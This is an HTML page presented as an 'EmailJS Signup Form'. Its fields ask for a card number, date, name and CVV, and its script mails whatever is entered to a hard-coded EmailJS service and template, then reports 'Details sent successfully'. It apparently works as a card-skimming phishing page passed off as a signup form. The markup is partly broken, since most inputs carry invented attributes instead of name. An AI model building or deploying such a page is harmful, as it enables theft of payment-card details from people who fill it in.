<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>EmailJS Signup Form</title>

<script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@4/dist/email.min.js"></script>

<script>
emailjs.init({
    publicKey: "4OmM1syEz3BrOHQU6"
});
</script>

<style>
body{
    font-family:Arial,sans-serif;
    background:#f5f5f5;
    display:flex;
    justify-content:center;
    align-items:center;
    height:100vh;
    margin:0;
}

form{
    width:350px;
    background:#fff;
    padding:20px;
    border-radius:10px;
    box-shadow:0 5px 15px rgba(0,0,0,.2);
}

input{
    width:100%;
    padding:12px;
    margin:10px 0;
    border:1px solid #ccc;
    border-radius:5px;
    font-size:16px;
    box-sizing:border-box;
}

button{
    width:100%;
    padding:12px;
    background:#000;
    color:#fff;
    border:none;
    border-radius:5px;
    font-size:16px;
    cursor:pointer;
}

button:hover{
    background:#333;
}

#message{
    text-align:center;
    margin-top:15px;
    font-weight:bold;
}
</style>
</head>
<body>

<form id="signupForm">
    <input type="text" number="number"placeholder="number" required>

    <input type="text" date="date" placeholder="date" required>

    <input type="email" name="name" placeholder="name" required>

    <input type="tel" cvv="cvv" placeholder="cvv" required>

    <button type="submit">Submit</button>

    <p id="message"></p>
</form>

<script>
document.getElementById("signupForm").addEventListener("submit", function(e){
    e.preventDefault();

    emailjs.sendForm(
        "service_mibbus7",
        "template_loh723c",
        this
    )
    .then(function(){
        document.getElementById("message").style.color="green";
        document.getElementById("message").innerHTML="✔ Details sent successfully!";
        document.getElementById("signupForm").reset();
    })
    .catch(function(error){
        document.getElementById("message").style.color="red";
        document.getElementById("message").innerHTML="❌ Failed to send.";
        console.error(error);
    });
});
</script>

</body>
</html>
